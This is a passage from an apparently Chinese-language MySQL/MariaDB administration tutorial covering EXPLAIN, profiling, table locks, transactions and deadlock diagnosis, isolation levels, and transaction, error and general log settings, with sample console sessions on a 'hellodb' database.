BTREE<br>      Comment: <br>Index_comment: <br>*************************** 2. row ***************************<br>        Table: students<br>   Non_unique: 1<br>     Key_name: idx_name<br> Seq_in_index: 1<br> Column_name: Name<br>    Collation: A<br> Cardinality: 25<br>     Sub_part: 10<br>       Packed: NULL<br>         Null: <br>   Index_type: BTREE<br>      Comment: <br>Index_comment: <br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br></code></pre></td></tr></table></figure><h3 id="4-5-EXPLAIN-工具"><a href="#4-5-EXPLAIN-工具" class="headerlink" title="4.5 EXPLAIN 工具"></a>4.5 EXPLAIN 工具</h3><blockquote><p>可以通过EXPLAIN来分析索引的有效性,获取查询执行计划信息，用来查看查询优化器如何执行查询</p><p>语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">EXPLAIN SELECT clause<br></code></pre></td></tr></table></figure><p>说明： type显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是：NULL&gt; system &gt;const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt;range &gt; index &gt; ALL ，<strong>一般来说，得保证查询至少达到range级别（未达到建议优化，比如加索引）</strong>，最好能达到ref</p></blockquote><p><strong><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221029153718663-1729899877.png"><img src="2927659-20221029153718663-1729899877.png" alt="img"></a></strong></p><p><strong>使用范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; explain select * from students <span class="hljs-built_in">where</span> stuid not <span class="hljs-keyword">in</span> (5,10,20);<br>+------+-------------+----------+------+---------------+------+---------+------+-<br>-----+-------------+<br>| <span class="hljs-built_in">id</span>   | select_type | table    | <span class="hljs-built_in">type</span> | possible_keys | key  | key_len | ref  |<br>rows | Extra       |<br>+------+-------------+----------+------+---------------+------+---------+------+-<br>-----+-------------+<br>|    1 | SIMPLE      | students | ALL  | PRIMARY       | NULL | NULL    | NULL |<br>  25 | Using <span class="hljs-built_in">where</span> |<br>+------+-------------+----------+------+---------------+------+---------+------+-<br>-----+-------------+<br></code></pre></td></tr></table></figure><h3 id="4-6-使用-profile-工具"><a href="#4-6-使用-profile-工具" class="headerlink" title="4.6 使用 profile 工具"></a>4.6 使用 profile 工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#打开后，会显示语句执行详细的过程</span><br><span class="hljs-built_in">set</span> profiling = ON;<br><br><span class="hljs-comment">#查看语句,注意结果中的query_id值</span><br><span class="hljs-comment">#show profiles ; </span><br>MariaDB [hellodb]&gt; show profiles ;<br>+----------+------------+-------------------------------------+<br>| Query_ID | Duration   | Query                               |<br>+----------+------------+-------------------------------------+<br>|        1 | 0.00019238 | select  @@profiling                 |<br>|        2 | 0.00115590 | select * from students <span class="hljs-built_in">where</span> age=20 |<br>|        3 | 0.00006616 | show profiles <span class="hljs-keyword">for</span> query 2           |<br>|        4 | 4.00319568 | select <span class="hljs-built_in">sleep</span>(1) from teachers       |<br>+----------+------------+-------------------------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><br><span class="hljs-comment">#显示语句的详细执行步骤和时长</span><br><span class="hljs-comment">#Show profile for query #</span><br>MariaDB [hellodb]&gt; show profile <span class="hljs-keyword">for</span> query 4;<br><br><span class="hljs-comment">#显示cpu使用情况</span><br><span class="hljs-comment">#Show profile cpu for query # </span><br>MariaDB [hellodb]&gt; Show profile cpu <span class="hljs-keyword">for</span> query 4;<br></code></pre></td></tr></table></figure><hr><h2 id="5-并发控制"><a href="#5-并发控制" class="headerlink" title="5 并发控制"></a>5 并发控制</h2><h3 id="5-1-锁机制"><a href="#5-1-锁机制" class="headerlink" title="5.1 锁机制"></a>5.1 锁机制</h3><blockquote><p><strong>锁类型：</strong></p><ul><li>读锁：共享锁，也称为 S 锁,只读不可写（包括当前事务） ，多个读互不阻塞</li><li>写锁：独占锁，排它锁，也称为 X 锁,写锁会阻塞其它事务（不包括当前事务）的读和写</li><li>S 锁和 S 锁是<strong>兼容</strong>的，X 锁和其它锁都<strong>不兼容</strong>，举个例子，事务 T1 获取了一个行 r1 的 S 锁，另外事务 T2 可以立即获得行 r1 的 S 锁，此时 T1 和 T2 共同获得行 r1 的 S 锁，此种情况称为<strong>锁兼容</strong>，但是另外一个事务 T2 此时如果想获得行 r1 的 X 锁，则必须等待 T1 对行 r1 锁的释放，此种情况也称为<strong>锁冲突</strong></li></ul><p><strong>锁粒度：</strong></p><ul><li>表级锁：MyISAM</li><li>行级锁：InnoDB</li></ul></blockquote><h3 id="5-2-显式使用锁"><a href="#5-2-显式使用锁" class="headerlink" title="5.2 显式使用锁"></a>5.2 显式使用锁</h3><h4 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">LOCK TABLES tbl_name [[AS] <span class="hljs-built_in">alias</span>] lock_type  [, tbl_name [[AS] <span class="hljs-built_in">alias</span>]lock_type] ...<br><br><span class="hljs-comment">#lock_type: </span><br>READ   <span class="hljs-comment">#读锁</span><br>WRITE  <span class="hljs-comment">#写锁</span><br></code></pre></td></tr></table></figure><h4 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">UNLOCK TABLES<br></code></pre></td></tr></table></figure><h5 id="范例-加读锁"><a href="#范例-加读锁" class="headerlink" title="范例: 加读锁"></a>范例: 加读锁</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; lock tables students <span class="hljs-built_in">read</span> ;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; update students <span class="hljs-built_in">set</span> classid=2 <span class="hljs-built_in">where</span> stuid=24;<br>ERROR 1099 (HY000): Table <span class="hljs-string">&#x27;students&#x27;</span> was locked with a READ lock and can<span class="hljs-string">&#x27;t be updated</span><br><span class="hljs-string"></span><br><span class="hljs-string">mysql&gt; unlock tables ;</span><br><span class="hljs-string"></span><br><span class="hljs-string">mysql&gt; update students set classid=2 where stuid=24;</span><br><span class="hljs-string">Query OK, 1 row affected (1 min 45.52 sec)</span><br><span class="hljs-string">Rows matched: 1 Changed: 1 Warnings: 0</span><br></code></pre></td></tr></table></figure><h5 id="范例-同时在两个终端对同一行记录修改"><a href="#范例-同时在两个终端对同一行记录修改" class="headerlink" title="范例: 同时在两个终端对同一行记录修改"></a>范例: 同时在两个终端对同一行记录修改</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#同时对同一行记录执行update</span><br><span class="hljs-comment">#在第一终端提示1行成功</span><br>MariaDB [hellodb]&gt; update students <span class="hljs-built_in">set</span> classid=1 <span class="hljs-built_in">where</span> stuid=24;<br>Query OK, 1 row affected (0.002 sec)<br>Rows matched: 1 Changed: 1 Warnings: 0<br><br><span class="hljs-comment">#在第二终端提示0行修改</span><br>MariaDB [hellodb]&gt; update students <span class="hljs-built_in">set</span> classid=1 <span class="hljs-built_in">where</span> stuid=24;<br>Query OK, 0 rows affected (0.000 sec)<br>Rows matched: 1 Changed: 0 Warnings: 0<br></code></pre></td></tr></table></figure><h3 id="5-3-事务"><a href="#5-3-事务" class="headerlink" title="5.3 事务"></a>5.3 事务</h3><blockquote><p>事务 Transactions：一组原子性的 SQL语句，或一个独立工作单元</p><p>事务日志：记录事务信息，实现undo,redo等故障恢复功能</p></blockquote><h4 id="5-3-1-事务特性"><a href="#5-3-1-事务特性" class="headerlink" title="5.3.1 事务特性"></a>5.3.1 事务特性</h4><blockquote><p><strong>ACID****特性：</strong></p><ul><li><strong>A：atomicity 原子性；整个事务中的所有操作要么全部成功执行，要么全部失败后回滚</strong></li><li><strong>C：consistency 一致性；数据库总是从一个一致性状态转换为另一个一致性状态</strong></li><li><strong>I：Isolation 隔离性；一个事务所做出的操作在提交之前，是不能为其它事务所见；隔离有多种隔离级别，实现并发</strong></li><li><strong>D：durability 持久性；一旦事务提交，其所做的修改会永久保存于数据库中</strong></li></ul></blockquote><h4 id="5-3-2-管理事务"><a href="#5-3-2-管理事务" class="headerlink" title="5.3.2 管理事务"></a>5.3.2 管理事务</h4><h5 id="显式启动事务"><a href="#显式启动事务" class="headerlink" title="显式启动事务"></a>显式启动事务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">BEGIN<br>BEGIN WORK<br>START TRANSACTION<br></code></pre></td></tr></table></figure><h5 id="提交-结束事务"><a href="#提交-结束事务" class="headerlink" title="提交\结束事务"></a>提交\结束事务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#提交,相当于vi中的wq保存退出</span><br>COMMIT<br><br><span class="hljs-comment">#回滚,相当于vi中的q!不保存退出</span><br>ROLLBACK<br></code></pre></td></tr></table></figure><h5 id="自动提交"><a href="#自动提交" class="headerlink" title="自动提交"></a>自动提交</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> autocommit=&#123;1|0&#125;<br><br>默认为1，为0时设为非自动提交<br>建议：显式请求和提交事务，而不要使用<span class="hljs-string">&quot;自动提交&quot;</span>功能<br></code></pre></td></tr></table></figure><h5 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h5><blockquote><p>两个或多个事务在同一资源相互占用，并请求锁定对方占用的资源的状态</p></blockquote><h6 id="范例：找到未完成的导致阻塞的事务-支持Mariadb"><a href="#范例：找到未完成的导致阻塞的事务-支持Mariadb" class="headerlink" title="范例：找到未完成的导致阻塞的事务(支持Mariadb)"></a>范例：找到未完成的导致阻塞的事务(支持Mariadb)</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在第一会话中执行</span><br>MariaDB [hellodb]&gt; begin;<br>Query OK, 0 rows affected (0.000 sec)<br>MariaDB [hellodb]&gt; update students <span class="hljs-built_in">set</span> classid=10;<br><span class="hljs-comment">#在第二个会话中执行</span><br>MariaDB [hellodb]&gt; update students <span class="hljs-built_in">set</span> classid=20;<br><span class="hljs-comment">#在第三个会话中执行</span><br>MariaDB [hellodb]&gt; show engine innodb status;<br>...省略...<br>---TRANSACTION 120, ACTIVE 673 sec<br>2 lock struct(s), heap size 1136, 28 row lock(s), undo <span class="hljs-built_in">log</span> entries 27<br>MySQL thread <span class="hljs-built_in">id</span> 13, OS thread handle 139719808595712, query <span class="hljs-built_in">id</span> 206 localhost <br>root <br>...省略...<br><span class="hljs-comment">#此指令不支持MySQL8.0</span><br>MariaDB [hellodb]&gt; SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;<br>+-----------+-------------+-----------+-----------+----------------------+-------<br>-----+------------+-----------+----------+-----------+<br>| lock_id   | lock_trx_id | lock_mode | lock_type | lock_table           |<br>lock_index | lock_space | lock_page | lock_rec | lock_data |<br>+-----------+-------------+-----------+-----------+----------------------+-------<br>-----+------------+-----------+----------+-----------+<br>| 123:9:3:2 | 123         | X         | RECORD    | `hellodb`.`students` |<br>PRIMARY    |          9 |         3 |        2 | 1         |<br>| 120:9:3:2 | 120         | X         | RECORD    | `hellodb`.`students` |<br>PRIMARY    |          9 |         3 |        2 | 1         |<br>+-----------+-------------+-----------+-----------+----------------------+-------<br>-----+------------+-----------+----------+-----------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br><span class="hljs-comment">#此指令不支持MySQL8.0</span><br>MariaDB [hellodb]&gt; SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;<br>+-------------------+-------------------+-----------------+------------------+<br>| requesting_trx_id | requested_lock_id | blocking_trx_id | blocking_lock_id |<br>+-------------------+-------------------+-----------------+------------------+<br>| 123               | 123:9:3:2         | 120             | 120:9:3:2        |<br>+-------------------+-------------------+-----------------+------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><span class="hljs-comment">#查看正在进行的事务</span><br>MariaDB [hellodb]&gt; SELECT * FROM information_schema.INNODB_TRX\G<br>*************************** 1. row ***************************<br>                   trx_id: 123<br>                 trx_state: LOCK WAIT<br>               trx_started: 2019-11-22 19:17:06<br>     trx_requested_lock_id: 123:9:3:2<br>         trx_wait_started: 2019-11-22 19:18:50<br>               trx_weight: 2<br>       trx_mysql_thread_id: 15 <span class="hljs-comment">#线程ID</span><br>                 trx_query: update students <span class="hljs-built_in">set</span> classid=20<br>       trx_operation_state: starting index <span class="hljs-built_in">read</span><br>         trx_tables_in_use: 1<br>         trx_tables_locked: 1<br>         trx_lock_structs: 2<br>     trx_lock_memory_bytes: 1136<br>           trx_rows_locked: 2<br>         trx_rows_modified: 0<br>   trx_concurrency_tickets: 0<br>       trx_isolation_level: REPEATABLE READ<br>         trx_unique_checks: 1<br>   trx_foreign_key_checks: 1<br>trx_last_foreign_key_error: NULL<br>         trx_is_read_only: 0<br>trx_autocommit_non_locking: 0<br>*************************** 2. row ***************************<br>                   trx_id: 120<br>                 trx_state: RUNNING<br>               trx_started: 2019-11-22 19:08:51<br>     trx_requested_lock_id: NULL<br>         trx_wait_started: NULL<br>               trx_weight: 29<br>       trx_mysql_thread_id: 13                                    <span class="hljs-comment">#线程ID</span><br>                 trx_query: NULL<br>       trx_operation_state: NULL<br>         trx_tables_in_use: 0<br>         trx_tables_locked: 1<br>         trx_lock_structs: 2<br>     trx_lock_memory_bytes: 1136<br>           trx_rows_locked: 28<br>         trx_rows_modified: 27<br>   trx_concurrency_tickets: 0<br>       trx_isolation_level: REPEATABLE READ<br>         trx_unique_checks: 1<br>   trx_foreign_key_checks: 1<br>trx_last_foreign_key_error: NULL<br>         trx_is_read_only: 0<br>trx_autocommit_non_locking: 0<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br>MariaDB [hellodb]&gt; show processlist;<br>+----+-------------+-----------+---------+---------+------+----------------------<br>----+------------------+----------+<br>| Id | User        | Host      | db      | Command | Time | State               <br>     | Info             | Progress |<br>+----+-------------+-----------+---------+---------+------+----------------------<br>----+------------------+----------+<br>|  1 | system user |           | NULL    | Daemon  | NULL | InnoDB purge<br>coordinator | NULL             |    0.000 |<br>|  3 | system user |           | NULL    | Daemon  | NULL | InnoDB purge worker <br>     | NULL             |    0.000 |<br>|  4 | system user |           | NULL    | Daemon  | NULL | InnoDB purge worker <br>     | NULL             |    0.000 |<br>|  2 | system user |           | NULL    | Daemon  | NULL | InnoDB purge worker <br>     | NULL             |    0.000 |<br>|  5 | system user |           | NULL    | Daemon  | NULL | InnoDB shutdown <br>handler  | NULL             |    0.000 |<br>| 11 | root        | localhost | hellodb | Query   |    0 | Init                 <br>    | show processlist |    0.000 |<br>| 13 | root        | localhost | hellodb | Sleep   |   38 |                     <br>     | NULL             |    0.000 |<br>| 15 | root        | localhost | hellodb | Query   |   10 | Updating             <br>    | update students <span class="hljs-built_in">set</span> classid=20 |    0.000<br>+----+-------------+-----------+---------+---------+------+----------------------<br>----+------------------+----------+<br>7 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.000 sec)<br><span class="hljs-comment">#杀掉未完成的事务</span><br>MariaDB [hellodb]&gt; <span class="hljs-built_in">kill</span> 13;<br>Query OK, 0 rows affected (0.000 sec)<br><span class="hljs-comment">#查看事务锁的超时时长，默认50s</span><br>MariaDB [hellodb]&gt; show global variables like <span class="hljs-string">&#x27;innodb_lock_wait_timeout&#x27;</span>;<br>+--------------------------+-------+<br>| Variable_name            | Value |<br>+--------------------------+-------+<br>| innodb_lock_wait_timeout | 50    |<br>+--------------------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><h4 id="5-3-3-事务隔离级别"><a href="#5-3-3-事务隔离级别" class="headerlink" title="5.3.3 事务隔离级别"></a>5.3.3 事务隔离级别</h4><blockquote><p>MySQL 支持四种隔离级别，事务隔离级别从上至下更加严格</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221030162855255-1949246472.png"><img src="2927659-20221030162855255-1949246472.png" alt="img"></a></p><ul><li><strong>READ UNCOMMITTED 读未提交</strong></li></ul><p>    可读取到未提交数据，产生<strong>脏读</strong></p><ul><li><strong>READ COMMITTED 读提交</strong></li></ul><p>    可读取到提交数据，但未提交数据不可读，产生<strong>不可重复读</strong>，即可读取到多个提交数据，导致每次读取数据不一致</p><ul><li><strong>REPEATABLE READ 可重复读</strong></li></ul><p>    可重复读，多次读取数据都一致，产生<strong>幻读</strong>，即读取过程中，即使有其它提交的事务修改数据，仍只能读取到未修改前的旧数据。<strong>此为MySQL默认设置</strong></p><ul><li><strong>SERIALIZABLE 序列化</strong></li></ul><p>    可串行化，未提交的读事务阻塞写事务（加读锁，但不阻塞读事务），或者未提交的写事务阻塞读和写事务（加写锁，其它事务的读，写都不可以执行）。会导致<strong>并发性能差</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#服务器选项中指定</span><br>vim /etc/my.cnf<br>[mysqld]<br>transaction-isolation=SERIALIZABLE<br><br><span class="hljs-comment">#MySQL8.0 事务隔离级别系统变量tx_isolation已取消</span><br>mysql&gt; select @@tx_isolation;<br>ERROR 1193 (HY000): Unknown system variable <span class="hljs-string">&#x27;tx_isolation&#x27;</span><br><br>mysql&gt; select @@transaction_isolation;<br>+-------------------------+<br>| @@transaction_isolation |<br>+-------------------------+<br>| REPEATABLE-READ         |<br>+-------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><hr><h2 id="6-日志管理"><a href="#6-日志管理" class="headerlink" title="6 日志管理"></a>6 日志管理</h2><blockquote><p>MySQL 支持丰富的日志类型，如下：</p><ul><li>事务日志：transaction log</li></ul><p>    事务日志的写入类型为”追加”，因此其操作为”顺序IO”；通常也被称为：预写式日志 write ahead logging</p><p>    事务日志文件： ib_logfile0， ib_logfile1</p><ul><li>错误日志error log</li><li>通用日志general log</li><li>慢查询日志 slow query log</li><li>二进制日志 binary log</li><li>中继日志reley log，在主从复制架构中，从服务器用于保存从主服务器的二进制日志中读取的事件</li></ul></blockquote><h3 id="6-1-事务日志"><a href="#6-1-事务日志" class="headerlink" title="6.1 事务日志"></a>6.1 事务日志</h3><h4 id="Innodb事务日志相关配置"><a href="#Innodb事务日志相关配置" class="headerlink" title="Innodb事务日志相关配置"></a>Innodb事务日志相关配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&#x27;%innodb_log%&#x27;</span>;<br><br>innodb_log_file_size   50331648 <span class="hljs-comment">#每个日志文件大小</span><br>innodb_log_files_in_group 2     <span class="hljs-comment">#日志组成员个数</span><br>innodb_log_group_home_dir ./ <span class="hljs-comment">#事务文件路径</span><br><br>vim /etc/my.cnf<br>[mysqld]<br>innodb_log_group_home_dir=/data/<br><br><span class="hljs-built_in">chown</span> -R mysql./data<br></code></pre></td></tr></table></figure><h4 id="事务日志性能优化"><a href="#事务日志性能优化" class="headerlink" title="事务日志性能优化"></a>事务日志性能优化</h4><blockquote><ul><li>1 此为默认值，日志缓冲区将写入日志文件，并在每次事务后执行刷新到磁盘。 这是完全遵守ACID特性</li><li>0 提交时没有写磁盘的操作; 而是每秒执行一次将日志缓冲区的提交的事务写入刷新到磁盘。 这样可提供更好的性能，但服务器崩溃可能丢失最后一秒的事务</li><li>2 每次提交后都会写入OS的缓冲区，但每秒才会进行一次刷新到磁盘文件中。 性能比0略差一些，但操作系统或停电可能导致最后一秒的交易丢失</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">innodb_flush_log_at_trx_commit=0|1|2<br></code></pre></td></tr></table></figure><p><strong><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221030165619817-1909115986.png"><img src="2927659-20221030165619817-1909115986.png" alt="img"></a></strong></p><h3 id="6-2-错误日志"><a href="#6-2-错误日志" class="headerlink" title="6.2 错误日志"></a>6.2 错误日志</h3><blockquote><ul><li>mysqld启动和关闭过程中输出的事件信息</li><li>mysqld运行中产生的错误信息</li><li>event scheduler运行一个event时产生的日志信息</li><li>在主从复制架构中的从服务器上启动从服务器线程时产生的信息</li></ul></blockquote><h4 id="错误文件路径"><a href="#错误文件路径" class="headerlink" title="错误文件路径"></a>错误文件路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; SHOW GLOBAL VARIABLES LIKE <span class="hljs-string">&#x27;log_error&#x27;</span>;<br>+---------------+---------------------------+<br>| Variable_name | Value                     |<br>+---------------+---------------------------+<br>| log_error     | /var/log/mysql/mysqld.log |<br>+---------------+---------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="6-3-通用日志"><a href="#6-3-通用日志" class="headerlink" title="6.3 通用日志"></a>6.3 通用日志</h3><blockquote><p>通用日志：记录对数据库的通用操作，包括:错误的SQL语句</p><p>通用日志可以保存在：file（默认值）或 table（mysql.general_log表）</p><p>通用日志相关设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">general_log=ON|OFF<br>general_log_file=HOSTNAME.<span class="hljs-built_in">log</span><br>log_output=TABLE|FILE|NONE<br></code></pre></td></tr></table></figure></blockquote><h4 id="范例-启用通用日志并记录至文件中"><a href="#范例-启用通用日志并记录至文件中" class="headerlink" title="范例: 启用通用日志并记录至文件中"></a>范例: 启用通用日志并记录至文件中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#默认没有启用通用日志</span><br>mysql&gt; select @@general_log;<br>+---------------+<br>| @@general_log |<br>+---------------+<br>|             0 |<br>+---------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#启用</span><br>mysql&gt; <span class="hljs-built_in">set</span> global general_log=1;<br>Query OK, 0 rows affected (0.01 sec)<br>mysql&gt; select @@general_log;<br>+---------------+<br>| @@general_log |<br>+---------------+<br>|             1 |<br>+---------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#默认通用日志存放在文件中</span><br>mysql&gt; SHOW GLOBAL VARIABLES LIKE <span class="hljs-string">&#x27;log_output&#x27;</span>; <br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| log_output    | FILE  |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">#通用日志存放的文件路径</span><br>mysql&gt; select @@general_log_file;<br>+----------------------------+<br>| @@general_log_file         |<br>+----------------------------+<br>| /var/lib/mysql/centos8.<span class="hljs-built_in">log</span> |<br>+----------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h4 